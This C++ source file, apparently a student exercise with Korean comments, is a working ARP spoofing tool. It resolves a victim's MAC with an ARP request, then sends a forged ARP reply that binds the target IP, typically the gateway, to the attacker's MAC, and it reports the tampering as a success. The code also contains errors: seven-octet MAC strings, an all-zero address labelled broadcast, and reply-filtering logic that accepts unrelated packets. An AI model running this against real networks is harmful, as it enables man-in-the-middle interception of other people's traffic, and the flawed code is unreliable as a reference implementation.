#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <unistd.h>
#include <cstdio>
#include <pcap.h>
#include "mac.h"
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]");
	printf("sample: send-arp-test wlan0\n");
}

/* 맥 주소 읽어오는 함수 참고 링크 */
/* https://bit.ly/3bRPjyB */
bool get_MyMac(char* MacAddr,const char *if_config)
{
    uint8_t m_MAC_func[20];
	int sockfd;
	struct ifreq ifr;
	
	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0)
	{
		printf("소켓 정보를 읽어올 수 없습니다.\n");
		exit(1);
	}

	strcpy(ifr.ifr_name, if_config);

	if(ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0 )
	{
		printf("맥 정보를 읽어올 수 없습니다.\n");
		close(sockfd);
		exit(1);
	}

	memcpy(m_MAC_func, ifr.ifr_addr.sa_data, 6);
	sprintf(MacAddr, "%02x:%02x:%02x:%02x:%02x:%02x", m_MAC_func[0], m_MAC_func[1], m_MAC_func[2], m_MAC_func[3], m_MAC_func[4], m_MAC_func[5]);

	ioctl(sockfd, SIOCGIFADDR, &ifr);

    return true;
};

/* IP 주소 읽어오는 함수 참고 링크 */
/* https://technote.kr/176 */
bool get_myIP(char* myip, const char *if_config)
{
    struct ifreq ifr;
	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, if_config, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	} 
	else {
		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, myip,sizeof(struct sockaddr));
	}

	return true;
}

int main(int argc, char* argv[]) {
	/* argv[0] : ./send-arp-test
	   argv[1] : interface
	   argv[2] : sendIP
	   argv[3] : targetIP */
	if (argc < 4) {
		usage();
		return -1;
	}

	// interface 정보 받아오기
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		//올바르지 않은 값인 경우 오류 출력
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	//Mac, IP 에 대한 정보 배열 값 선언
	char m_MAC[20];
	char s_MAC[20];
    char m_IP[20];
	char* s_IP = argv[2];
	char* t_IP = argv[3];

	//각 함수 값이 올바르게 들어오지 않은 경우 종료
	if(!get_MyMac(m_MAC, dev)){
		exit(1);
	}
	if(!get_myIP(m_IP, dev)){
		exit(1);
	}

	printf("사용자의 Mac Address [%s]",m_MAC);
	printf("\n");
	printf("사용자의 IP Address [%s]", m_IP);
	printf("\n");

	//처음 보내는 Packet 통해서 gateway 에 대한 Mac address 얻어옴
	//Gateway 에게 Request 전송을 통해 Reply로 Mac address 획득

	printf("패킷 전송을 통해 Sneder Mac Address 를 얻어옵니다 . . .\n");

	EthArpPacket Packet;

	Packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff:ff");
	Packet.eth_.smac_ = Mac(m_MAC);
	Packet.eth_.type_ = htons(EthHdr::Arp);

	Packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	Packet.arp_.pro_ = htons(EthHdr::Ip4);
	Packet.arp_.hln_ = Mac::SIZE;
	Packet.arp_.pln_ = Ip::SIZE;
	Packet.arp_.op_ = htons(ArpHdr::Request);
	Packet.arp_.smac_ = Mac(m_MAC); 
	Packet.arp_.sip_ = htonl(Ip(m_IP));
	Packet.arp_.tmac_ = Mac("00:00:00:00:00:00:00");
	Packet.arp_.tip_ = htonl(Ip(s_IP));

	/* eth arp 순서
	Packet.eth_.dmac_ = Broadcast (ff:ff:ff:ff:ff:ff:ff)
	Packet.eth_.smac_ = My Mac

	Packet.arp_.smac_ = My Mac
	Packet.arp_.sip_ = My IP (htonl를 통해서 엔디안 변환)
	Packet.arp_.tmac_ = Broadcast (00:00:00:00:00:00:00)
	Packet.arp_.tip_ = Gateway IP
	*/

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	while(1)
	{
		printf("패킷 전송을 위해 Victim Mac Address 를 얻어옵니다 . . . \n");
		const u_char* packet;
		struct pcap_pkthdr* header;
		res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		EthHdr Reply_Ether;
        ArpHdr Reply_ARP;
        u_char* ether_length = (u_char*)packet;
        u_char* arp_length = ether_length + sizeof(EthHdr);
		
		if(memcpy(&Reply_Ether, ether_length, sizeof(EthHdr)) == NULL){
			printf("헤더 정보를 읽어올 수 없습니다.\n");
			return -1;
		}

		if(Reply_Ether.type() != EthHdr::Arp){
            if(Reply_Ether.dmac().operator!=(Mac(m_MAC))){
                continue;
            }
        }
		
		if(memcpy(&Reply_ARP, arp_length, sizeof(ArpHdr)) == NULL){
			printf("헤더 정보를 읽어올 수 없습니다.\n");
			return -1;
		}

		if(Reply_ARP.op() != ArpHdr::Reply){
            if(Reply_ARP.tmac_.operator!=(Mac(m_MAC))){   
                if(!Reply_ARP.tip().operator==(Ip(m_IP))){
			        continue;
                }
            }
        }

		sprintf(s_MAC,"%s",((std::string)Reply_Ether.smac()).c_str());
		break;
	}

	EthArpPacket arp_packet;

	arp_packet.eth_.dmac_ = Mac(s_MAC);
	arp_packet.eth_.smac_ = Mac(m_MAC);
	arp_packet.eth_.type_ = htons(EthHdr::Arp);

	arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
	arp_packet.arp_.hln_ = Mac::SIZE;
	arp_packet.arp_.pln_ = Ip::SIZE;
	arp_packet.arp_.op_ = htons(ArpHdr::Reply);
	arp_packet.arp_.smac_ = Mac(m_MAC);
	arp_packet.arp_.sip_ = htonl(Ip(t_IP));
	arp_packet.arp_.tmac_ = Mac(s_MAC);
	arp_packet.arp_.tip_ = htonl(Ip(s_IP));

	/* eth arp 순서
	Packet.eth_.dmac_ = Sender Mac
	Packet.eth_.smac_ = My Mac

	Packet.arp_.smac_ = My Mac
	Packet.arp_.sip_ = Terget IP (htonl를 통해서 엔디안 변환)
	Packet.arp_.tmac_ = Sender Mac
	Packet.arp_.tip_ = Sender IP
	*/

	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_packet), sizeof(EthArpPacket));
	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	printf("ARP 정보 변조 성공!\n");
	
	pcap_close(handle);
	return 0;
}